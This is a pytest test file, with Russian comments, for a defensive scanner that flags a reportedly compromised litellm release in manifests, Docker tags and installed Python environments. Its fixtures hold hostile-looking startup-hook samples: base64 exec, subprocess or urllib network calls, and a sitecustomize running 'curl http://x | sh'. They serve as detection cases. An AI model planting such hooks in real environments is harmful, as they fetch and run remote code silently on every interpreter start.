"""Линия защиты «Чёрный октябрь» (23.10.2026): сканер экспозиции к скомпрометированным компонентам.

Фикстуры синтетические, во временных папках. Сканер читает только манифесты зависимостей и крошечные .pth/sitecustomize;
личные данные, переписки и значения секретов он не открывает и не печатает.
"""
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
_spec = importlib.util.spec_from_file_location("advisory_exposure_check", ROOT / "tools" / "advisory_exposure_check.py")
aec = importlib.util.module_from_spec(_spec)
sys.modules["advisory_exposure_check"] = aec          # dataclass с отложенными аннотациями ищет модуль по имени
_spec.loader.exec_module(aec)  # type: ignore[union-attr]

WATCHLIST = ROOT / "docs" / "owner" / "advisories" / "black-october-20261023.json"


@pytest.fixture()
def wl():
    return aec.load_watchlist(WATCHLIST)


def _kinds(findings):
    return sorted({(f.kind, f.component) for f in findings})


# ------------------------------------------------------------------ watchlist

def test_watchlist_is_valid_and_pins_the_known_bad_litellm_release(wl):
    rule = next(r for r in wl["deny"] if r["component"] == "litellm")
    assert "1.107.0" in rule["versions"] and "latest" in rule["docker_tags"]
    assert rule["status"].startswith(("CORROBORATED", "UNVERIFIED"))          # статус заявлен честно, не «VERIFIED»
    assert {w["component"] for w in wl["watch"]} >= {"nginx", "gitlab", "php", "wordpress"}


def test_broken_watchlist_is_rejected(tmp_path):
    bad = tmp_path / "w.json"
    bad.write_text(json.dumps({"deny": [{"component": "litellm"}]}), encoding="utf-8")        # нет versions/status
    with pytest.raises(aec.WatchlistError):
        aec.load_watchlist(bad)
    bad.write_text("{not json", encoding="utf-8")
    with pytest.raises(aec.WatchlistError):
        aec.load_watchlist(bad)


# ------------------------------------------------------------------ манифесты

def test_pinned_bad_release_is_deny_in_requirements(tmp_path, wl):
    (tmp_path / "requirements.txt").write_text("fastapi==0.110.0\nlitellm==1.107.0\n", encoding="utf-8")
    f = aec.scan_manifests(tmp_path, wl)
    assert ("DENY", "litellm") in _kinds(f)
    hit = next(x for x in f if x.kind == "DENY")
    assert hit.path.endswith("requirements.txt") and hit.line == 2


@pytest.mark.parametrize("line", ["litellm", "litellm>=1.100", "litellm~=1.106", "litellm[proxy]>=1", "LiteLLM"])
def test_unpinned_litellm_fails_closed(tmp_path, wl, line):
    (tmp_path / "requirements.txt").write_text(line + "\n", encoding="utf-8")
    assert ("UNPINNED", "litellm") in _kinds(aec.scan_manifests(tmp_path, wl))


def test_safe_pin_is_only_informational(tmp_path, wl):
    (tmp_path / "requirements.txt").write_text("litellm==1.106.2\n", encoding="utf-8")
    assert _kinds(aec.scan_manifests(tmp_path, wl)) == [("PRESENT", "litellm")]


def test_lookalike_package_names_do_not_match(tmp_path, wl):
    (tmp_path / "requirements.txt").write_text("litellm-proxy-docs==9.9\nmy-litellm-notes\n", encoding="utf-8")
    assert aec.scan_manifests(tmp_path, wl) == []


@pytest.mark.parametrize("image,expected", [
    ("ghcr.io/berriai/litellm:main-latest", "DENY"), ("docker.io/berriai/litellm:v1.107.0", "DENY"),
    ("ghcr.io/berriai/litellm:latest", "DENY"), ("ghcr.io/berriai/litellm:main-stable", "DENY"),
    ("ghcr.io/berriai/litellm:v1.106.2", "PRESENT"), ("ghcr.io/berriai/litellm", "UNPINNED"),
])
def test_docker_image_tags(tmp_path, wl, image, expected):
    (tmp_path / "docker-compose.yml").write_text(f"services:\n  llm:\n    image: {image}\n", encoding="utf-8")
    assert (expected, "litellm") in _kinds(aec.scan_manifests(tmp_path, wl))


def test_workflow_and_package_json_are_scanned_but_vendored_dirs_are_skipped(tmp_path, wl):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("steps:\n  - run: pip install litellm==1.107.0\n", encoding="utf-8")
    (tmp_path / "package.json").write_text('{"dependencies": {"nginx-conf": "1.0.0"}}', encoding="utf-8")
    vend = tmp_path / "node_modules" / "x"
    vend.mkdir(parents=True)
    (vend / "requirements.txt").write_text("litellm==1.107.0\n", encoding="utf-8")
    found = aec.scan_manifests(tmp_path, wl)
    assert [f.path for f in found if f.kind == "DENY"] == [".github/workflows/ci.yml"]


def test_watch_components_are_listed_but_never_fail(tmp_path, wl):
    (tmp_path / "Dockerfile").write_text("FROM nginx:1.29\nRUN apt-get install -y php8.3\n", encoding="utf-8")
    found = aec.scan_manifests(tmp_path, wl)
    assert {f.component for f in found} >= {"nginx", "php"} and {f.kind for f in found} == {"PRESENT"}


def test_the_real_repository_has_no_bad_or_unpinned_litellm(wl):
    """Постоянный страж в CI: скомпрометированный релиз не должен попасть в манифесты main."""
    bad = [f for f in aec.scan_manifests(ROOT, wl) if f.kind in {"DENY", "UNPINNED"}]
    assert bad == [], [(f.component, f.path, f.line) for f in bad]


# ------------------------------------------------------------------ окружения Python

def _site(tmp_path: Path, name="env") -> Path:
    sp = tmp_path / name / "Lib" / "site-packages"
    sp.mkdir(parents=True)
    (tmp_path / name / "pyvenv.cfg").write_text("home = x\n", encoding="utf-8")
    return sp


def test_installed_bad_release_is_deny(tmp_path, wl):
    sp = _site(tmp_path)
    (sp / "litellm-1.107.0.dist-info").mkdir()
    f = aec.scan_site_packages([sp], wl)
    assert ("DENY", "litellm") in _kinds(f)


def test_installed_safe_release_and_clean_env(tmp_path, wl):
    sp = _site(tmp_path, "a")
    (sp / "litellm-1.106.2.dist-info").mkdir()
    assert _kinds(aec.scan_site_packages([sp], wl)) == [("PRESENT", "litellm")]
    clean = _site(tmp_path, "b")
    assert aec.scan_site_packages([clean], wl) == []


@pytest.mark.parametrize("body", [
    "import base64; exec(base64.b64decode('cHJpbnQoMSk='))",
    "import subprocess; subprocess.Popen(['curl','http://x'])",
    "import urllib.request; urllib.request.urlopen('http://litellm.dev/x')",
])
def test_suspicious_pth_is_an_indicator(tmp_path, wl, body):
    sp = _site(tmp_path)
    (sp / "init_hook.pth").write_text(body, encoding="utf-8")
    assert ("INDICATOR", "python-startup-hook") in _kinds(aec.scan_site_packages([sp], wl))


def test_known_benign_pth_and_plain_sitecustomize_are_not_flagged(tmp_path, wl):
    sp = _site(tmp_path)
    (sp / "distutils-precedence.pth").write_text(
        "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
        "enabled and __import__('_distutils_hack').add_shim();", encoding="utf-8")
    (sp / "paths.pth").write_text("C:\\work\\libs\n", encoding="utf-8")
    (sp / "sitecustomize.py").write_text("import sys\nsys.dont_write_bytecode = True\n", encoding="utf-8")
    assert aec.scan_site_packages([sp], wl) == []


def test_suspicious_sitecustomize_is_an_indicator(tmp_path, wl):
    sp = _site(tmp_path)
    (sp / "sitecustomize.py").write_text("import os\nos.system('curl http://x | sh')\nexec(open('p').read())\n", encoding="utf-8")
    assert ("INDICATOR", "python-startup-hook") in _kinds(aec.scan_site_packages([sp], wl))


def test_find_python_envs_discovers_venvs_without_following_junk(tmp_path):
    _site(tmp_path, "proj1")
    _site(tmp_path, "nested/proj2")
    (tmp_path / "node_modules" / "x").mkdir(parents=True)
    found = aec.find_site_packages([tmp_path], max_depth=4)
    assert len(found) == 2 and all(p.name == "site-packages" for p in found)


# ------------------------------------------------------------------ CLI и приватность

def test_cli_exit_codes_and_report_has_no_file_contents(tmp_path, wl, capsys):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "requirements.txt").write_text("litellm==1.107.0  # SECRET-NOTE-DO-NOT-ECHO\n", encoding="utf-8")
    out = tmp_path / "report.json"
    code = aec.main(["--repo", str(repo), "--watchlist", str(WATCHLIST), "--json", str(out)])
    assert code == 1
    report = json.loads(out.read_text(encoding="utf-8"))
    assert report["verdict"] == "FAIL" and report["counts"]["DENY"] == 1
    assert "SECRET-NOTE" not in out.read_text(encoding="utf-8") and "SECRET-NOTE" not in capsys.readouterr().out

    (repo / "requirements.txt").write_text("fastapi==0.110.0\n", encoding="utf-8")
    assert aec.main(["--repo", str(repo), "--watchlist", str(WATCHLIST), "--json", str(out)]) == 0
    assert json.loads(out.read_text(encoding="utf-8"))["verdict"] == "PASS"


def test_indicator_gives_review_exit_code_not_silent_pass(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    sp = _site(tmp_path, "venv")
    (sp / "x.pth").write_text("import base64; exec(base64.b64decode('AA=='))", encoding="utf-8")
    code = aec.main(["--repo", str(repo), "--watchlist", str(WATCHLIST), "--env-root", str(tmp_path / "venv")])
    assert code == 2


# ------------------------------------------------------------------ имена сервисов не шумят, обязательный тег/digest = закреплено

@pytest.mark.parametrize("line", [
    "  litellm:",                                   # ключ сервиса compose
    "      - litellm",                              # depends_on
    "      litellm:",
    "      LITELLM_URL: http://litellm:4000/v1",   # адрес внутри сети, не образ
    "      LITELLM_MASTER_KEY: ${LITELLM_MASTER_KEY}",
    "      POSTGRES_DB: litellm",
])
def test_compose_service_names_and_env_vars_are_not_declarations(tmp_path, wl, line):
    (tmp_path / "compose.yaml").write_text(f"services:\n{line}\n", encoding="utf-8")
    assert [f for f in aec.scan_manifests(tmp_path, wl) if f.component == "litellm"] == []


@pytest.mark.parametrize("image", [
    "ghcr.io/berriai/litellm:${LITELLM_IMAGE_TAG:?set a verified pinned tag}",
    "ghcr.io/berriai/litellm@sha256:" + "a" * 64,
])
def test_required_variable_tag_or_digest_counts_as_pinned(tmp_path, wl, image):
    (tmp_path / "compose.yaml").write_text(f"services:\n  llm:\n    image: {image}\n", encoding="utf-8")
    assert _kinds(aec.scan_manifests(tmp_path, wl)) == [("PRESENT", "litellm")]


def test_variable_tag_with_a_floating_default_is_not_pinned(tmp_path, wl):
    (tmp_path / "compose.yaml").write_text(
        "services:\n  llm:\n    image: ghcr.io/berriai/litellm:${LITELLM_IMAGE_TAG:-main-latest}\n", encoding="utf-8")
    assert ("DENY", "litellm") in _kinds(aec.scan_manifests(tmp_path, wl))


def test_pip_install_line_in_a_script_is_a_declaration(tmp_path, wl):
    (tmp_path / "Dockerfile").write_text("FROM python:3.12\nRUN pip install litellm\n", encoding="utf-8")
    assert ("UNPINNED", "litellm") in _kinds(aec.scan_manifests(tmp_path, wl))


NSPKG = ("import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], "
         "*('google',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');"
         "m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec(importlib.machinery.PathFinder."
         "find_spec('google', [os.path.dirname(p)])));m = m or sys.modules.setdefault('google', types.ModuleType('google'));"
         "mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n")


def test_standard_setuptools_namespace_pth_is_benign(tmp_path, wl):
    sp = _site(tmp_path)
    (sp / "protobuf-3.19.6-nspkg.pth").write_text(NSPKG, encoding="utf-8")
    assert aec.scan_site_packages([sp], wl) == []


def test_namespace_template_marker_does_not_excuse_network_calls(tmp_path, wl):
    sp = _site(tmp_path)
    (sp / "evil-nspkg.pth").write_text(NSPKG.rstrip("\n") + ";import urllib.request;urllib.request.urlopen('http://x')\n",
                                       encoding="utf-8")
    assert ("INDICATOR", "python-startup-hook") in _kinds(aec.scan_site_packages([sp], wl))
